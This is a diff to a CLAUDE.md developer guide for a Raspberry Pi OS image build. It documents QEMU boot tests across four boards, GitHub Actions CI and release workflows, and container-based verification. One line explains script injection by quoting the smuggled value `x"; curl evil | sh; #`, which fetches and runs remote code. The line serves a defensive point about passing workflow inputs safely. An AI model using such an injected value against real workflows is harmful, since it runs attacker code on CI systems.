@@ -4,9 +4,9 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 
 ## Project Status
 
-Steps 1 to 6 are committed; steps 7 and 8 — the last two sections of the `Makefile` and `tools/qemu.sh` — are not. **All eight steps of `README.md` are implemented**: the boot partition, the cross-compiler, musl libc, busybox, the kernel modules, the bootable image, the QEMU test, and the launcher.
+Everything through step 8 is committed; the board table in the `Makefile` and `.github/workflows/` are not. **Everything `README.md` specifies is implemented**: the boot partition, the cross-compiler, musl libc, busybox, the kernel modules, the bootable image, the QEMU test, the launcher, and CI plus the manual release build.
 
-Layout, matching the sibling `boot` repository and already encoded in `.gitignore`: `overlay/` (the files that are copied into the root filesystem verbatim — source, not generated), `tools/` (things a person runs, as opposed to things make runs), `downloads/` (fetched upstream artifacts, kept across `clean`), `build/` (everything generated), `dist/` (release artifacts).
+Layout, matching the sibling `boot` repository and already encoded in `.gitignore`: `overlay/` (the files that are copied into the root filesystem verbatim — source, not generated), `tools/` (things a person runs, as opposed to things make runs), `.github/workflows/` (CI and the manual release), `downloads/` (fetched upstream artifacts, kept across `clean`), `build/` (everything generated), `dist/` (release artifacts).
 
 ## Commands
 
@@ -41,6 +41,8 @@ gmake IMAGE_SIZE_MIB=512 image          # a roomier card image
 gmake test                              # everything below, ~45 s
 gmake boot-check                        # boot as a Pi 3, assert it reaches a login prompt
 gmake grow-check                        # boot a padded copy, assert the first-boot resize
+gmake smoke                             # boot it as all four emulable boards
+gmake QEMU_BOARD=pi4 boot-check         # boot it as one specific board
 gmake boot-log                          # the serial log of the last boot-check
 gmake run                               # boot it in a QEMU window and log in
 gmake RUN_ARGS=-f run                   # the same, starting from a fresh card
@@ -155,7 +157,9 @@ Three parts: e2fsprogs, the staged tree, and the image.
 - **`boot-check` checks each step of the boot separately** rather than only looking for the login prompt: kernel up as a Pi 3, both partitions enumerated, root mounted, init started, `/` remounted read-write, first boot ran, a getty started, prompt appeared. When something breaks, *which of those is the last to pass* is the entire diagnosis. Booting with `QEMU_CONSOLE=ttyAMA0` demonstrates it — everything through the remount passes and the three userspace lines fail, which is exactly the signature of a userspace with no console.
 - **`grow-check` runs without `snapshot=on`**, because the thing under test is the reboot between the two passes of `sepia-firstboot`; it works on a copy padded to `GROW_SIZE_MIB`. It then checks the log *and* the partition table it left behind, since a resize that reports success and writes a table nothing can boot is the failure worth catching. 4 GiB is the smallest sensible card: below 64 GB the README asks for 1 GiB of swap, so anything smaller is all swap and no growth.
 - QEMU is killed as soon as the log says what was being waited for, rather than always burning `QEMU_TIMEOUT`. It has to be killed either way — with no VideoCore and no shutdown request it sits at the login prompt indefinitely.
-- **Only the Pi 3 is emulated**, which is what the README asks for. A Pi 4 run would need three changes and not more: `QEMU_MACHINE=raspi4b`, the `bcm2711-rpi-4-b.dtb`, and `QEMU_ROOTDEV=/dev/mmcblk1p2` — under QEMU the Pi 4 exposes the card as `mmcblk1` where real hardware uses `mmcblk0`. Pi 5 and CM5 have no QEMU machine at all, so BCM2712 is hardware-only.
+- **`QEMU_BOARD` selects the board**, and `make smoke` runs every one QEMU can emulate: `pi-zero2w`, `pi3`, `pi4`, `cm4`. Pi 5 and CM5 have no QEMU machine at all, so BCM2712 is hardware-only — the same split `../boot` makes. The Zero 2 W is emulated as `raspi3b` rather than `raspi3ap`, whose device tree takes a synchronous external abort in `bcm2835_power_probe`.
+- **All four register the PL011 as `ttyAMA1`** — checked on each, not assumed from the Pi 3 — so one `QEMU_CONSOLE` covers them. What does differ is per-SoC: the PL011 sits at `0xfe201000` on BCM2711 against `0x3f201000` on BCM2837, and under QEMU the Pi 4 and CM4 expose the card as `mmcblk1` where BCM2837 and real hardware use `mmcblk0`. That last one is why the `root=` passed to QEMU and the `root=` in the image's own `cmdline.txt` legitimately differ.
+- The per-board expected `Machine model` string is asserted too, so a test cannot quietly pass having booted the wrong device tree.
 
 ### How step 8 works
 
@@ -169,6 +173,29 @@ Three parts: e2fsprogs, the staged tree, and the image.
 - The launcher never writes to the image. It copies it once to `build/qemu/run.img`, pads that copy out to `-s` (4 GiB by default, sparse, so it costs what is written), and reuses it — a changed password or an added file is still there next time. `-f` starts over, `-t` discards just this run's writes.
 - **An intermittent kernel panic on the warm reboot was seen once** and did not reproduce in four further runs — an Oops in an interrupt on a secondary CPU during `secondary_start_kernel`, straight after QEMU's machine reset. It looks like an emulator artifact rather than anything in the image; it is worth knowing about if `grow-check` ever fails once and then passes.
 - Verified by driving the emulated keyboard through the QEMU monitor (`sendkey`) and reading the framebuffer back with `screendump`: login as `root`, the default password accepted, the forced password change enforced and completed, and a shell prompt that runs commands. That is also how the step 6 login requirements were confirmed — there is no other way to see the framebuffer console from a terminal.
+
+### How the workflows work
+
+Both mirror `../boot`'s, because the two repositories are cut the same way and there is no reason for them to differ. `ci.yml` runs on every push to every branch and on pull requests against main; `release.yml` is `workflow_dispatch` only.
+
+- **Both build in `debian:trixie-slim`, and the container is not decoration.** QEMU's `raspi4b` machine arrived in QEMU 9.0; Debian 12 ships 7.2 and Ubuntu 24.04 ships 8.2, so on a bare runner the Pi 4 and CM4 smoke tests could not run at all. Trixie ships 10.x. Before changing the image, check `qemu-system-aarch64 -machine help | grep raspi4b`.
+- **Tools are installed before `actions/checkout`**, deliberately: without git in the container, checkout silently falls back to downloading a tarball, and the Makefile needs git for the module fetch and the musl version lookup.
+- **`downloads/` is cached, and the cache is restored *after* checkout**, never before — checkout runs `git clean -ffdx` on an existing workspace and would delete it. The cache pays for itself on the ~600 MiB cross-toolchain alone. Everything in there is keyed by version or tag and immutable, so a stale entry is only ever unused, never wrong; that is what makes the loose `restore-keys` prefix safe.
+- **CI is one job, not a matrix over boards.** The build produces a single card that is supposed to boot all four, and four parallel jobs would each build their own image — testing four different cards rather than the claim being made. They really would differ: the image is not byte-reproducible, because mke2fs stamps a random filesystem UUID. The cost is wall-clock time rather than confidence.
+- `QEMU_TIMEOUT` is raised to 300 in CI. Hosted runners are x86_64, so the AArch64 guests run under full TCG emulation, several times slower than the machine this was developed on. A generous cap costs nothing, because each run stops as soon as its serial log says what it was waiting for.
+- **The release branches main into `rel-<version>` before building, not after.** Everything then happens on that branch — build, tests, tag — so the released commit is on a branch that still exists afterwards, whatever main does next. The gate job validates the version and refuses an existing branch, tag or release before the half-hour build starts.
+- **`inputs.version` reaches bash through the environment, never through `${{ }}` interpolation**, because `${{ }}` is substituted before bash sees the line: a version of `x"; curl evil | sh; #` would otherwise run.
+- The release's `prerelease` input does double duty: it marks the GitHub release *and* selects `CHANNEL`, so a full release takes the latest full release of the boot partition and a pre-release takes the latest pre-release. It defaults to true, because `Sepia-OS/boot` has no full release yet and a `CHANNEL=release` build would stop with "has no full release yet".
+- The release notes are filled in from `build/rootfs/etc/os-release` in the built tree, so the boot release, firmware tag and kernel versions they quote cannot drift from what was actually built. GitHub attaches the tag's source archives itself, which is the "with the sources" half of the requirement.
+
+### What was checked, and how
+
+The workflows cannot be run here, so the parts that could be were checked directly:
+
+- **The Linux build path had never been exercised** before this — every build until now used the macOS toolchain. Running the CI's own container (`docker run --platform linux/arm64 debian:trixie-slim`) with the CI's own package list built the image end to end, including the Arm `14.3.rel1` `aarch64-none-linux-gnu` toolchain that only Linux hosts download. The package list is therefore known-complete rather than plausible.
+- **The whole pipeline was then run in that container**: `make image`, `make smoke` (all four boards to a login prompt) and `make grow-check`, against Debian's QEMU 10.0.11 rather than the Homebrew 11.1.0 everything else was developed on. Green. The one thing this cannot show is the x86_64 TCG timing, which is why `QEMU_TIMEOUT` is raised rather than left at its default.
+- **Build inside the container's filesystem, not a bind mount.** A first attempt bind-mounting the working tree from macOS failed in e2fsprogs with `chmod: changing permissions of 'compile_et': Permission denied` — an artifact of Docker Desktop's shared filesystem, not of the build. GitHub's workspace is an ordinary filesystem, so this does not apply there, but it is worth knowing before concluding the build is broken.
+- All four boards were booted locally to a login prompt from one image, and the first-boot resize was checked on `pi4` as well as `pi3` — the Pi 4 is the case where the card is `mmcblk1`, so it is the one that proves `sepia-firstboot` resolves the disk from sysfs rather than assuming a name.
 
 ### Make dependency layout
 
